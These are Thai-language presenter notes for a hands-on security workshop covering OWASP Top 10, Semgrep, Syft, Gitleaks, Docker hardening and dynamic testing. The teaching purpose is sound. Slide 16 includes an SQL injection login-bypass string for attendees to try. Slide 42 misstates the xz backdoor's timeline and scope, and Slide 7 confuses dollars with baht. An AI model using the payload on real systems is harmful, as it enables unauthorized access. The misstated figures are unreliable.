# Speaker Notes — DEVDAY EP.3
# Security Code Review & Scanning Tools

> สำหรับ presenter อ่านระหว่าง present แยกออกมาเป็นไฟล์เดียว
> Slide numbers เป็น approximate — Reveal.js นับ nested sections แยก
> Updated outline: 4 hours (08:00-12:30) — 5 sessions + Session 5 เป็น Dynamic Testing
> Appendix A (Docker Security) + Appendix B (CI/CD Integration) = self-study

## Slide Index (new order)

| # | Slide | Section |
|---|-------|---------|
| 1 | Title | Opening |
| 2 | Agenda (4hr timeline) | Opening |
| 3 | Course Overview | Opening |
| 4 | Learning Objectives | Opening |
| 5 | Prerequisites | Opening |
| 6 | Session 1 Title | Session 1 |
| 7 | Why Security Code Review? | Session 1 |
| 8 | Shift-Left Security | Session 1 |
| 9 | Security Scanning ในวงจร SDLC (NEW) | Session 1 |
| 10 | Security Activity ในแต่ละ Phase (NEW) | Session 1 |
| 11 | OWASP Top 10 (2025) Overview | Session 1 |
| 12-21 | A01 → A10 details | Session 1 |
| 22 | Session 2 Title | Session 2 |
| 23 | Security Code Review Checklist | Session 2 |
| 24 | Exercise 1: Manual Code Review | Session 2 |
| 25 | Break | — |
| 26 | Session 3 Title | Session 3 |
| 27 | 3 Categories of Security Tools | Session 3 |
| 28 | SAST: Semgrep | Session 3 |
| 29 | SCA: Syft + Dependency-Track | Session 3 |
| 30 | Secret Scanning: Gitleaks | Session 3 |
| 31 | ITSC MIS Use Case (NEW) | Session 3 |
| 32 | ITSC MIS — Key Takeaways (NEW) | Session 3 |
| 33 | Session 4 Title | Session 4 |
| 34 | Lab Setup | Session 4 |
| 35 | Part A: SAST with Semgrep | Session 4 |
| 36 | Part B: SCA with Syft | Session 4 |
| 37 | Part C: Secret Scanning with Gitleaks | Session 4 |
| 38 | Exercise 3: Fix & Validate | Session 4 |
| 39 | Part D: Docker Security Review | Session 4 |
| 40-49 | Docker deep-dive slides | Session 4 |
| 50 | Session 5 Title — Dynamic Testing | Session 5 |
| 51 | What is Dynamic Testing? | Session 5 |
| 52 | 5.1 JWT Intro | Session 5 |
| 53 | JWT — Common Attacks | Session 5 |
| 54 | JWT — Mitigations | Session 5 |
| 55 | 5.2 File Upload Intro | Session 5 |
| 56 | File Upload — Attack Patterns | Session 5 |
| 57 | File Upload — Mitigations | Session 5 |
| 58 | 5.3 OS Command Injection Intro | Session 5 |
| 59 | OS Command Injection — Patterns | Session 5 |
| 60 | OS Command Injection — Mitigations | Session 5 |
| 61 | Wrap-up | Closing |
| 62 | Thank You | Closing |
| 63 | Appendix Title (Docker + CI/CD self-study) | Appendix |
| 64 | Docker Security Scanning Checklist | Appendix |

---

## Slide 1: Title
**Security Code Review & Scanning Tools**

- ทักทายสั้นๆ แนะนำตัวเอง
- ย้ำว่านี่เป็น workshop แบบ hands-on — ไม่ใช่บรรยาย
- เช็ค prerequisites: laptop + internet + tools ติดตั้งแล้ว
- "วันนี้เราจะทำ scan จริง และแก้ช่องโหว่จริง"

---

## Slide 2: Agenda (4 ชั่วโมง | 08:00-12:30)

- อธิบาย flow ตาม timeline ใหม่:
  - 08:00-08:30 Registration
  - 08:30-09:15 Session 1 (OWASP + SDLC Intro)
  - 09:15-10:00 Session 2 (Manual Review + Hands-on 1)
  - 10:00-10:15 Break
  - 10:15-10:45 Session 3 (Tools Overview + ITSC MIS Use Case)
  - 10:45-11:30 Session 4 (Hands-on Lab)
  - 11:30-12:30 Session 5 (Dynamic Testing: JWT / File Upload / OS Command Injection)
  - 12:30+ Lunch
- เน้นว่า Session 4 (Lab) และ Session 5 (Dynamic Testing) เป็นหัวใจของ workshop
- บอกเวลาพัก: 10:00-10:15
- ไม่มี standalone Q&A — ถามได้ระหว่าง session + Wrap-up รวม Q&A ไว้
- ให้รู้ว่ามี lab checklist ใน `docs/lab-checklist.md`
- Appendix A (Docker security) + Appendix B (CI/CD integration) = self-study material

---

## Slide 3: Course Overview

- "วันนี้เราจะเรียนรู้ security scanning + dynamic testing จริงๆ — ไม่ใช่แค่ทฤษฎี"
- อธิบาย stat boxes: 5 sessions, 4 ชั่วโมง hands-on, 4+ tools ที่จะลองใช้จริง + 3 dynamic testing topics
- เน้นว่าเป้าหมายคือ "เมื่อเลิกไปวันนี้ คุณสามารถกลับไป scan project ของคุณเอง + เข้าใจ attack patterns ได้ทันที"

---

## Slide 4: Learning Objectives

- อ่านทีละข้อ ให้ผู้เรียนเห็นภาพรวม
- เน้น 5 ข้อ นี้คือ "competencies" ที่จะได้ ไม่ใช่แค่ความรู้
- "พอจบวันนี้ คุณจะรู้ว่ามี tools อะไร และใช้ยังไง ในการหาช่องโหว่ใน code"

---

## Slide 5: Prerequisites

- ถาม举手 "ใครมีประสบการณ์ dev มากกว่า 1 ปี?"
- เน้น tools ที่ต้องติดตั้งล่วงหน้า — ส่ง email แจ้ง 1 สัปดาห์ก่อน
- "ถ้าใครยังไม่ได้ติดตั้ง หลัง break มาหาผมช่วยติดตั้ง"

---

## Slide 6 (~h.v 6.1): Session 1 Title
**Security Fundamentals & OWASP Top 10 (45 min)**

- "เริ่มจากพื้นฐานก่อน จะได้เข้าใจ context ของการ scan"
- ใช้เวลา 45 นาที ดีไหม? — ถ้าเหลือเวลา จะย่อ OWASP บางข้อ

---

## Slide 7 (~h.v 6.2): Why Security Code Review?

- พูดจาก experience: "เคยเจอ bug ใน production ที่ scan ตั้งแต่ dev แล้วจะเจอ"
- $4.45M — ย้ำตัวเลข ให้คนจำ "4 ล้านกว่าบาท"
- 287 days — "เกือบ 1 ปี ถึงจะรู้ว่าโดน"
- "เป้าหมายคือทำให้เจอเร็วขึ้น ลดเวลา 287 วันนี้ลง"

---

## Slide 8 (~h.v 6.3): Shift-Left Security

- อธิบาย concept: ยิ่งซ้าย (เร็ว) ยิ่งถูก
- เปรียบเทียบต้นทุน: ตอน design แก้ฟรี ตอน production แก่ร้อยเท่า
- ให้มองว่า security scan = automated code reviewer ที่ดูแค่มุม security
- "Shift-left ไม่ใช่แค่เรื่อง tools — เป็น mindset ที่ต้องคิด security ตั้งแต่เขียน code"
- Bridge ไป slide ถัดไป: "ถ้าเราเข้าใจ SDLC loop แล้วเราจะรู้ว่า security activity ต้องไปวางที่ไหน"

---

## Slide 9 (~h.v 6.4): Session 1 Intro — Security Scanning ในวงจร SDLC (NEW)

- "DevOps ไม่ใช่เส้นตรง — เป็น infinity loop: Dev ↔ Ops ตลอดเวลา"
- วาดหรือชี้ภาพ DevOps infinity loop: **Plan → Code → Build → Test → Release → Deploy → Operate → Monitor → (กลับมา Plan)**
- ย้ำ key message: "Security ต้องไหลผ่านทุก phase ไม่ใช่ gate เดียวที่ท้าย pipeline"
- Reference diagram: `https://media.geeksforgeeks.org/wp-content/uploads/20230410112114/DevOps.png`
- ถาม audience: "ทีมคุณ security อยู่ phase ไหนบ้าง?" — ส่วนใหญ่ตอบ Test/Release เท่านั้น
- Bridge: "เรามาดูว่าแต่ละ phase ทำ security activity อะไรได้บ้าง"

---

## Slide 10 (~h.v 6.5): Security Activity ในแต่ละ Phase (NEW)

- อ่านตารางทีละ row ให้ผู้เรียนเห็น mapping:
  - **Plan** → Threat modeling, abuse cases
  - **Code** → IDE security plugins, pre-commit (Gitleaks)
  - **Build (CI)** → SAST (Semgrep), SCA (Syft + Dependency-Track), Secret scan
  - **Test** → DAST baseline
  - **Release** → Image scan (Trivy/Grype), policy gate
  - **Deploy / Operate** → Runtime monitoring, vulnerability management, IR
- "สังเกต tools ที่เราจะใช้วันนี้ — Semgrep, Syft, Gitleaks — อยู่ฝั่งซ้าย (Code + Build) ทั้งหมด = shift-left ที่แท้จริง"
- "DAST + image scan = Session 5 + Appendix A — เราจะแตะกันใน Session 5 (Dynamic Testing)"
- "Session 3 จะเห็น real-world pipeline จาก ITSC MIS ว่าเอา tools เหล่านี้มาวางไว้ตรงไหนจริงๆ"
- Bridge: "ตอนนี้มาดู vulnerability ที่จะเจอใน phase เหล่านี้ — OWASP Top 10"

---

## Slide 11 (~h.v 6.6): OWASP Top 10 (2025) — Overview

- อธิบายสั้นๆ ว่า OWASP คืออะไร: องค์กร nonprofit ที่จัดอันดับ web security risks
- อัปเดตทุก 3-4 ปี (ล่าสุด 2025)
- เน้นว่านี่คือ "common knowledge" ที่ developer ทุกคนควรรู้
- แยก 3 กลุ่ม: แดง (critical) เหลือง (yellow) ฟ้า (cyan) — ให้เห็นระดับความสำคัญ
- มีหมวดใหม่ 2 หมวด: A03 Supply Chain Failures และ A10 Exceptional Conditions, SSRF รวมเข้า A01

---

## Slide 12 (~h.v 6.7): A01: Broken Access Control

- เน้นว่าขึ้นจากอันดับ 5 → 1 เพราะพบบ่อยที่สุด
- ให้ตัวอย่าง IDOR: "เปลี่ยน URL เลข 1 = เห็นข้อมูลคนอื่น"
- แสดง code ตัวอย่าง: "ดูบรรทัดนี้ ขาดอะไร?" → authorization check
- ถ้ามีเวลา: ให้ผู้เรียนคิดตัวอย่างเพิ่ม (เช่น API ของบริษัทที่เคยเจอ)
- ใน 2025 SSRF ถูกรวมเข้ามาใน A01 เพราะ access control ของ server-side requests

---

## Slide 13 (~h.v 6.8): A02: Security Misconfiguration

- เปลี่ยนจากอันดับ 5 → 2 เพราะ misconfiguration พบได้ง่ายและบ่อยมาก
- DEBUG=True คือตัวอย่าง classic — เจอบ่อยใน production
- เพิ่มตัวอย่าง: S3 bucket public, directory listing, missing security headers
- "hardening checklist = checklist ที่ต้องทำก่อน deploy ทุกครั้ง"

---

## Slide 14 (~h.v 6.9): A03: Software Supply Chain Failures (NEW)

- หมวดใหม่สำคัญมาก — เกิดจากเหตุการณ์ใหญ่ๆ เช่น SolarWinds และ XZ Utils
- XZ Utils: "คิดเป็น backdoor ใน open source library ที่ใช้ในทุก Linux distro"
- Dependency confusion: "ชื่อ package เดียวกัน แต่ registry ต่างกัน — internal vs public"
- เน้นว่า SCA tools (Syft + Dependency-Track) ใน lab คือเครื่องมือป้องกันอย่างหนึ่ง
- Lock files + private registries + SBOM = defense in depth

---

## Slide 16 (~h.v 6.11): A05: Injection

- นี่คือ vulnerability ที่คนรู้จักดีที่สุด — ให้เน้น
- SQL Injection: พิมพ์ตัวอย่างลงบน whiteboard หรือให้ผู้เรียนลอง: `' OR 1=1 --`
- XSS: อธิบายผลกระทบ — steal cookies, redirect เว็บ, deface
- Command Injection: "รุนแรงมาก — ลบทั้ง server ได้ด้วยคำสั่งเดียว"
- เน้นว่า parameterized queries แก้ได้ทั้ง 3 ประเภทนี้

---

## Slide 17 (~h.v 6.12): A05: Injection (cont.)

- แสดงตัวอย่าง Python code ทั้ง bad และ good
- เน้นว่า `subprocess.run([...])` ใช้ list ไม่ใช่ string — ป้องกัน shell injection
- "ถ้าจะจำอย่างเดียว จำ parameterized queries"
- XXE เป็น injection แบบ XML — อ่านไฟล์จาก server ได้ ใช้ defusedxml ป้องกัน

---

## Slide 18 (~h.v 6.13): A06: Insecure Design

- เน้นว่านี่ต่างจากอันดับอื่น — แก้ด้วย code ไม่ได้ ต้องออกแบบใหม่
- ตัวอย่าง rate limiting: "ลองนึกว่าถ้าไม่จำกัด login attempt — brute force เล่นเอง"
- "ถ้าออกแบบไม่ดี ตั้งแต่แรก แก้ทีหลังยิ่งยาก"
- แนะนำ threat modeling เป็น practice

---

## Slide 15 (~h.v 6.10): A04: Cryptographic Failures

- เปลี่ยนจากอันดับ 2 → 4
- MD5 คือตัวอย่าง classic — เคยใช้กัน เดี๋ยวใช้ bcrypt/argon2
- เพิ่ม: TLS 1.0/1.1 ยังคงพบใน legacy systems
- เพิ่ม: IV/salt management — "บางครั้ง algorithm ถูกแต่ใช้ผิดวิธี"
- เน้น "อย่า hardcode keys" → ใช้ env vars หรือ secret manager

---

## Slide ~: (A06 旧 Vulnerable Components → รวมเข้า A03 Supply Chain)

- Content นี้รวมเข้า A03 Supply Chain Failures แล้ว
- ยกตัวอย่าง Log4Shell ในบริบท supply chain แทน

---

## Slide 19 (~h.v 6.14): A07: Authentication Failures

- เพิ่มชื่อเต็ม: Authentication Failures (ย่อจาก Identification & Authentication)
- ให้ยกมือถ้าใครในห้องเคยใช้ password '123456'
- MFA: อธิบายว่าแม้แค่ SMS ก็ดีกว่าไม่มี
- Session ID ใน URL: อธิบายว่า URL ถูก log ได้, share ได้, browser history เหลือบ
- Credential stuffing: อธิบายว่า bot ลอง password ที่หลุดจาก website อื่น

---

## Slide 20 (~h.v 6.15): A08: Software or Data Integrity Failures

- SolarWinds: "supply chain attack ที่ใหญ่ที่สุด — 18,000+ องค์กร"
- อธิบายว่าไม่ใช่แค่ install library — CI/CD pipeline เองก็โดนเข้าได้
- Insecure deserialization: อธิบายสั้นๆ ว่าเป็นอะไร (pickle exploit)
- "verify ทุกอย่างที่ download มา — checksums, signatures"

---

## Slide 21 (~h.v 6.16): A09: Logging and Alerting Failures

- เปลี่ยนชื่อเน้น alerting — มี log แต่ไม่มี alert เท่ากับไม่มี
- "ถ้าไม่ log ก็เหมือนถูกขโมยแล้วไม่รู้"
- ให้ตัวอย่าง: ถ้า brute force แต่ไม่ log → ไม่รู้จนกว่าโดน
- เน้น balance: log พอแต่ไม่ log sensitive data (GDPR, privacy)
- แนะนำ centralized logging: ELK, Grafana Loki

---

## Slide 22 (~h.v 6.17): A10: Mishandling of Exceptional Conditions (NEW)

- หมวดใหม่ แทน SSRF (ซึ่งย้ายไป A01)
- "fail-open vs fail-closed" — อธิบายว่า fail-open อันตรายกว่า: "ระบบทำงานต่อแม้ auth ล้มเหลว"
- Crash DoS: "exception ไม่ handle → ทั้ง server crash → attacker ส่ง request พิเศษซ้ำๆ"
- Sensitive data in errors: "เคยเห็น stack trace ที่เปิดเผย DB credentials, API keys, file paths"
- ตัวอย่างจาก lab: `app.py` มี `debug=True` และ verbose error messages
- "log internally, generic message to user"

---

## Slide 23 (~h.v 7.1): Session 2 Title
**Manual Code Review Techniques**

- "ตอนนี้เราจะลงมือหาช่องโหว่เอง ก่อนใช้ tools"
- อธิบายว่า manual review ยังจำเป็น — tools ไม่เห็น business logic flaws

---

## Slide 24 (~h.v 7.2): Security Code Review Checklist

- อ่าน checklist ทั้ง 7 categories ให้ฟัง
- เน้นว่านี่คือ "minimum" — ควรรู้มากกว่านี้
- "ถ้า review PR แล้วดูแค่ function logic ละ — ลืมมอง security แล้ว"

---

## Slide 25 (~h.v 7.3): Exercise 1: Manual Code Review

- **จัดกลุ่ม 2-3 คน**
- แจก code จาก `lab/vulnerable-app/app.py`
- "มี 12 ช่องโหว่ ซ่อนอยู่ — ลองหาให้มากที่สุด"
- ให้ 10 นาทีหา + 8 นาทีเฉลย
- **ถ้าหาครบทั้ง 12 = เก่งมาก**

---

## Slide 26 (~h.v 8): Break (10:00-10:15)

- "พัก 10 นาที ก่อนเข้าสู่ส่วน tools"
- ตอนพัก: ให้ผู้เรียนเปิด laptop ตรวจสอบ tools พร้อม

---

## Slide 27 (~h.v 9.1): Session 3 Title
**Security Scanning Tools Overview**

- "ตอนนี้เราจะเรียนรู้ tools ที่จะใช้ใน lab"
- เน้นว่าจะสอนเฉพาะ tools ที่ใช้จริง — tools อื่นๆ อยู่ใน handout
- "เป้าหมายคือให้คุณรู้ว่ามี tools อะไรบ้าง และเลือกใช้ให้ถูก"

---

## Slide 28 (~h.v 9.2): 3 Categories of Security Tools

- SAST = static (ไม่ต้อง run code)
- SCA = dependencies (third-party libraries)
- Secret Scanning = credentials ที่หลุด
- "3 categories นี้ครอบคลุม security scanning ในระดับ code"
- บอกว่าเราจะใช้ Semgrep, Syft, Gitleaks ใน lab

---

## Slide 29 (~h.v 9.3): SAST: Semgrep

- "Semgrep คือ tool หลักที่เราจะใช้วันนี้"
- เน้นว่า pattern-based ไม่ใช่ regex — เข้าใจโครงสร้าง code
- รองรับ 30+ ภาษา — เหมาะกับทีมที่ใช้หลายภาษา
- แสดง command ให้เห็นว่าง่ายแค่ `semgrep scan --config auto .`

---

## Slide 30 (~h.v 9.4): SCA: Syft + Dependency-Track

- Syft: "สร้าง SBOM (Software Bill of Materials) — รายการอะไรอยู่ในเว็บ"
- อธิบาย SBOM แบบง่ายๆ: เหมือน.ingredients list ของอาหาร
- Dependency-Track: "ระบบที่เอา SBOM ไปเทียบกับ database ของ CVEs"
- DefectDojo: "รวมผลจาก tools ทั้งหมดไว้ที่เดียว"
- "SBOM คืออนาคตที่ government และ enterprise ให้ความสำคัญมาก"

---

## Slide 31 (~h.v 9.5): Secret Scanning: Gitleaks

- "Gitleaks คือ tool ที่ค้นหา secrets ที่ commit เข้า git โดยไม่ตั้งใจ"
- เน้นว่า scan Git history ทั้งหมด — ไม่ใช่แค่ working directory
- pre-commit hook: "ติดตั้งแล้วจะ block commit ที่มี secrets อัตโนมัติ"
- ให้เห็นว่านี่คือ safety net — ถ้า review พลาด Gitleaks จะจับได้

---

## Slide 32 (~h.v 9.6): ITSC MIS Use Case (NEW)

- Frame: "เราเรียน tools แยกๆ มาแล้ว — ตอนนี้ดู real-world reference architecture ว่ามันรวมใน production pipeline ยังไง"
- นี่คือ pipeline จริงของ ITSC MIS — "production system ของธนาคาร/enterprise จริง"
- เดิน flow ตามภาพทีละขั้น:
  1. **GitLab Repo** — source of truth
  2. **CI**:
     - Unit Testing (baseline quality gate)
     - **SAST + Secret Scan**: Trivy + Gitleaks → ถ้าเจอ critical = fail build
     - Build Artifact
     - Docker Image Build & Push → tag v2.4
     - **Grype Security Scan** ที่ image v2.4 → CVE check
     - **Security Policy Check** — gate สำคัญที่สุด ถ้าไม่ผ่าน block deploy
     - Update Kubernetes Manifest
  3. **CD**: `kubectl apply` → Kubernetes Cluster
  4. **DAST**: Burp-DAST Baseline หลัง deploy
  5. **Reports & Tracking**: dependency-track + DefectDojo (aggregator)
  6. **Notifications**: notify_ci_pipeline / notify_failure / notify_security_alert
- ย้ำ: "นี่ไม่ใช่ theoretical — มันคือ pipeline ที่มีอยู่จริง tools ที่เราใช้วันนี้ (Semgrep/Trivy, Syft, Gitleaks, Grype, Dependency-Track, DefectDojo) มีที่ทางหมด"
- ถ้ามีเวลา: ชี้ Reference image `/tmp/devday-refs/itsc-mis.png`

---

## Slide 33 (~h.v 9.7): ITSC MIS — Key Takeaways (NEW)

- อ่าน key points ทีละข้อ:
  - **Tools อยู่ถูกที่** — ทุก tool ที่เราเรียนวันนี้อยู่ใน pipeline จริง ไม่ใช่ของเล่น
  - **Security Policy Check คือ hard gate** — ไม่ผ่าน = ไม่ deploy (block, ไม่ใช่ warn)
  - **DAST หลัง deploy** = Dynamic Testing ที่ Session 5 เราจะเจาะลึก (JWT, File Upload, OS Command Injection)
  - **Reporting ที่ dependency-track + DefectDojo** = ไม่กระจัดกระจาย มี single pane of glass
  - **3 Notification channels** = no silent failure — ทุกอย่าง trace ได้
- Bridge ไป Session 4: "ตอนนี้เรารู้ pipeline ใหญ่แล้ว — ได้เวลาลงมือทำกับ tools จริง"

---

## Slide 34 (~h.v 10.1): Session 4 Title
**Hands-on Lab — Security Scanning**

- "นี่คือส่วนที่สำคัญที่สุดของวันนี้"
- ให้เปิด laptop เปิด terminal ไว้
- ย้ำ: "ทำตามผมทีละ step ถ้า stuck ให้ยกมือ"

---

## Slide 35 (~h.v 10.2): Lab Setup

- ให้ clone repo ถ้ายังไม่ได้ clone
- verify tools: `semgrep --version`, `syft --version`, `gitleaks version`
- "ถ้า tool ใดขาด ให้บอกเลย — ช่วยติดตั้ง"
- lab checklist อยู่ใน `docs/lab-checklist.md`

---

## Slide 36 (~h.v 10.3): Part A: SAST with Semgrep

- ให้รันคำสั่งตาม slide
- อธิบาย step 1-2: "รันแล้วดู output"
- Step 3 สำคัญ: เปรียบเทียบกับ manual review
  - "Tools พบอะไรที่คุณพลาด?"
  - "Manual review พบอะไรที่ tool พลาด?" (logic flaws, business logic)
- "คำตอบที่ 2 คือเหตุผลที่ manual review ยังจำเป็น"

---

## Slide 37 (~h.v 10.4): Part B: SCA with Syft + Dependency-Track

- ให้รัน `syft . -o cyclonedx-json > sbom.json`
- "เปิด sbom.json ดู — จะเห็น dependency ทั้งหมดพร้อม version"
- ถ้ามี Dependency-Track: อธิบายวิธี upload
- "ดูว่า library ไหน critical ที่สุด และต้อง update เป็น version อะไร"
- ถ้า Dependency-Track ไม่มี: ให้ใช้ `grype sbom.json` แทน (ใหม่ดีเท่า dependency-track แต่ง่ายกว่า)

---

## Slide 38 (~h.v 10.5): Part C: Secret Scanning with Gitleaks

- ให้รัน gitleaks detect
- "ดูว่าเจอ secret อะไรบ้าง — API key, password, token"
- แยก true positive vs false positive:
  - "ถ้าเจออะไรที่ดูเป็น key จริง = true positive"
  - "ถ้าเจอ string ที่บังเอิญตรงกับ pattern = false positive"
- อธิบายแนวทางแก้: env vars, rotate credentials, pre-commit hook

---

## Slide 39 (~h.v 10.6): Exercise 3: Fix & Validate

- "เลือก 3-5 critical/high vulnerabilities ที่พบ แล้วแก้ไข"
- ให้เปิด `app.py` แล้วแก้:
  - SQL → parameterized query
  - XSS → HTML escaping
  - Secrets → env vars
- "แก้เสร็จแล้วรัน scan อีกครั้ง — ถ้าหายคือแก้ถูกแล้ว"
- Solutions อยู่ที่ `lab/solutions/app_fixed.py`

---

## Slide 40 (~h.v 10.7): Part D: Docker Security Review

- "ตอนนี้เรามอง security ในอีกมุม — infrastructure as code"
- "เช่นเดียวกับ code, Dockerfile และ docker-compose.yml ก็มีช่องโหว่ได้"
- ให้เปิด `lab/vulnerable-app/Dockerfile` อ่าน
- "มี 14+ ช่องโหว่ — ทั้ง Dockerfile และ docker-compose.yml"
- **ถ้าเวลาไม่พอ**: ให้อ่านเป็น demo code review แทน hands-on — ก็ยังได้

---

## Slide 41 (~h.v 10.8): Why Docker Security Matters

- **Container ≠ VM** — นี่คือจุดเริ่มต้น "container ปลอดภัยอยู่แล้ว" ที่หลายหลายเห็น
- อธิบาย concept: container แชร์ kernel กับ host — ไม่ได้ isolate แบบ VM
- "ถ้า container root exploit kernel vulnerability ได้ = ได้ shell บน host เลย"
- **84% statistic**: อ้าง Sysdig 2024 report — "เกือบ 4 ใน 5 container ใน production มี critical/high vuln"
- **Attack surface 4 layers**: image → build context → runtime → network → secrets
- ถ้ามีเวลา: ให้ถาม "ใครเคยเจอ container โดน brute force หรือ DoS มั้ย?" — ส่วนใหญ่ container เป็น zero cost

---

## Slide 42 (~h.v 10.9): Image Security — Layers & Supply Chain

- อธิบาย layers: base image → dependencies → app code → config
- "ทุก layer ที่เพิ่มเข้าไปคือ attack surface เพิ่มขึ้น"
- **Alpine backdoor (พ.ค. 2024)**: นี่คือ real case — มี malicious code ถูกแทรกเข้า xz/utils ใน Alpine 3.19 และ 3.18 นานกว่า 3 ปี
- "สอนถาม: ใครใช้ base image อะไร? ตรวจสอบเคยว่ามี CVE แล้วหรือยัง?"
- **Supply chain**: "npm/pip install = คุณดาวนว่าแต่ละ library ถูก compromise หรือยัง"
- Pin by digest: อธิบายว่า `@sha256:abc123` = immutable — ถ้าไม่เปลี่ยนก็คือ image เดิม
- Demo: `docker scout cve python:3.12-slim-bookworm` ถ้ามี Docker

---

## Slide 43 (~h.v 10.10): Container Escape — What Happens When Root?

- Slide นี้สำคัญมากเพื่อสร้าง "wow factor" และทำให้เข้าใจถึงปัญหา root container
- **Attack chain** อธิบายทีละขั้น:
  1. App vuln (SQLi/RCE) → code execution in container
  2. Container root → exploit kernel capability
  3. Container escape → host shell
  4. Host pivot → อื่น containers/processes
- "สั้นเพียง 4 ขั้นจากการเพียง app vulnerability ก็เข้าถึง host ได้"
- **Defense**: อธิบาย cap-drop ALL + เลือกเฉพาะที่จำเป็น
- ถ้ามีเวลา: ให้แสดง `cap-drop` vs default capabilities — "default container มี ~14 capabilities เปิดอยู่ ส่วนใหญ่ไม่จำเป็น"
- Non-root USER คือ defense in depth — ถ้า escape ได้ก็ยังต้องเจอ privilege escalation

---

## Slide 44 (~h.v 10.11): Secrets Management in Containers

- เริ่มด้วย demo: `docker inspect` แสดง env vars — "ลองรันที่เครื่องดู จะเห็น password ทุกอัน"
- "docker compose config ก็แสดงทุก secret ง่ายๆ"
- "ถ้า push image ไป Docker Hub — env vars อยู่ใน image layers"
- **เปรียบ 4 approaches**:
  - Docker Secrets: "ดีแต่ใช้ได้แค่กับ Docker Swarm — แต่ไม่ครอบทุก case"
  - K8s Secrets: "ดีที่สุดถ้าใช้ Kubernetes — encrypted, RBAC, versioned"
  - Vault/AWS SM: "enterprise grade — rotation, audit, centralized แต่ซับซับ"
  - `_FILE` suffix: "ง่ายที่สุด — ใช้ได้กับทุก platform แต่ต้องจัดการ file permissions เอง"
- **Key point**: "ไม่ว่าจะใช้วิธีไหน — อย่าใส่ plaintext env vars ใน docker-compose.yml"

---

## Slide 45 (~h.v 10.12): Docker Scanning Tools

- สรุป: "ทีมนี้เราใช้ Syft (SBOM) + Gitleaks (secrets) อยู่แล้ว ตอนนี้เพิ่ม image scanning"
- **Trivy**: "comprehensive — scan ทั้ง image, filesystem, IaC, secrets ฟรี และครบบ" — แนะนำให้ลอง `trivy image <name>` ดู
- **Docker Scout**: "built-in Docker CLI — ถ้า install Docker Desktop อยู่แล้วใช้ได้เลย ไม่ต้องติดตั้งอะไร"
- **Hadolint**: "lint Dockerfile — เช่น ESLint แต่สำหรับ Dockerfile บอกว่า no-root, pinned, copy instead of add"
- **Dockle**: "analyze image — ขนาด ใหญ่, efficient, policy check"
- ถ้ามีเวลา: รัน `trivy image python:3.12-slim-bookworm` สดูผล — จะเห็นตัวอย่างจริง

---

## Slide 46 (~h.v 10.13): Dockerfile Vulnerabilities

- อ่านตารางทีละแถว อธิบายสั้นๆ — **เพิ่ม Impact column แล้ว**
- เน้น "root container" และ "unpinned image" เป็น critical — ให้อธิบาย impact
- "ให้คิดว่าถ้า attacker exploit ได้ใน container — ถ้าเป็น root = game over"
- **Impact column ให้เห็นภาพจน์ชัดเจน**: "container escape → host compromise"
- "latest tag ไม่ reproducible — วันนี้ build กับพรุ่งนี้อาจต่างกัน"
- Multi-stage: "build tools อยู่ใน final image = image ใหญ่ขึ้น, attack surface เพิ่ม"

---

## Slide 47 (~h.v 10.14): docker-compose.yml Vulnerabilities

- เน้น "secrets in plaintext env vars" เป็น critical — ให้แสดงว่า `docker inspect` เห็นได้
- "เห็น `DB_PASSWORD=supersecret123` ใน code — ใครก็เห็นได้"
- "Redis ไม่มี password = ใคร connect ได้ทุกคน" → ให้อธิบายว่า Redis เปิด port 6379 ให้ใครเข้ามา ใช้ `redis-cli` ได้เลย
- "DB port 5432 เปิดไว้ — คนภายน่าจะเข้า DB ไม่ได้" → ให้เชื่อนว่าถ้า DB ไม่ expose port ก็ยังเข้าถึงได้ผ่าน app container (แต่นี้ยังดีก)
- "Network segmentation = frontend ไม่เห็น backend, backend ไม่เห็น DB" — ให้อธิบายด้วย diagram ง่ายๆ: frontend → backend → DB
- Host volume mounts: "ถ้า container ถูก hack → อ่านไฟล์บน host ได้ผ่าน volume mount"
- `no-new-privileges`: "เปรียบกับ slide container escape — หากไม่ม no-new-privileges, setuid binary ใน image สามารถ้า root exploit ได้จะยก privilege"

---

## Slide 48 (~h.v 10.15): Secure Dockerfile — Key Fixes

- อธิบายแต่ละ fix:
  - Multi-stage: "แยก build กับ runtime — final image เล็กลง, attack surface ลดลง"
  - **เปรียบขนาน**: "image full ประมาณ ~1GB, slim ~150MB — ลด 85% เลย"
  - Non-root: "เป็น principle พื้นฐาน — container ไม่ควรเป็น root เลย"
  - Healthcheck: "Docker รู้ว่า app ตายหรือยัง แล้ว restart ให้"
  - Exec form: "PID 1 คือ app เอง — signal ทำงานถูกต้อง"
  - USER position: "ทำที่สุดท้าย — ถ้าต้วนหายแล้ว exec form แล้วไม่มี effect เพราะไม่ได้เป็น PID 1"
- ให้ดู fixed version ที่ `lab/solutions/Dockerfile`

---

## Slide 49 (~h.v 10.16): Secure docker-compose.yml — Key Fixes

- Secrets: "ใช้ Docker secrets แทน env vars — ไม่เห็นใน code และ inspect"
  - "file: ./secrets/db_password.txt = อ่านจาก file, ไม่อยู่ใน compose"
  - "ให้แต่ะ _FILE suffix — Docker จะ mount เป็น file ใน /run/secrets/"
- Port binding: "127.0.0.1 = เข้าได้แค่จากเครื่องตัวเอง ไม่ใช่ทั้ง internet"
  - "nginx/reverse proxy อยู่ข้างหน้า = ตั้ง proxy_pass ไป 127.0.0.1:5000"
- Resource limits: "memory 256M — ถ้า DDoS ก็กินแค่ 256M ไม่ใช่ทั้ง server"
  - "สำคัญ: ต้องจัดทั้ง service ใน compose ไม่ใช่แค่ app"
- Network segmentation:
  - "**frontend**: external — เปิด port ออก
  - "**backend**: internal — เปิด port ออกได้? ไม่ต้อง เฉพาะเปิดแค่ app เอง
  - "**db**: internal — ไม่เปิด portออกเลย ถ้าเคยใช้ Docker secrets"
  - "internal: true = container ใน network นี้ไม่ออก internet ได้ — แม้แม้ port forward"
- `no-new-privileges`: "ป้องกัน container ยกระดับ privilege — เพิ่มความปลอดภัยใน defense in depth"
- read_only: "อ่านเขียนได้แค่ /tmp — ถ้า attacker ได้ write จะได้ save malware"
- logging: "จำกว่าจำกวน log อะไร — ไม่ให้ log env vars หรือ request body ที่มี passwords"

---

## Slide 50 (~h.v 11.1): Session 5 Title — Dynamic Testing
**Dynamic Testing (60 min): JWT / File Upload / OS Command Injection**

- "Session 5 เปลี่ยนจากเดิม (CI/CD Integration) มาเป็น Dynamic Testing — เพราะ CI/CD overlap กับ ITSC MIS use case ที่เราดูไป Session 3 แล้ว"
- Frame: "SAST scanning = ตรวจ code ตอนหยุด, Dynamic testing = ตรวจ application ตอน run จริง"
- "3 topic วันนี้คือช่องโหว่ที่ SAST ไม่เห็น และพบบ่อยสุดใน pentest report"
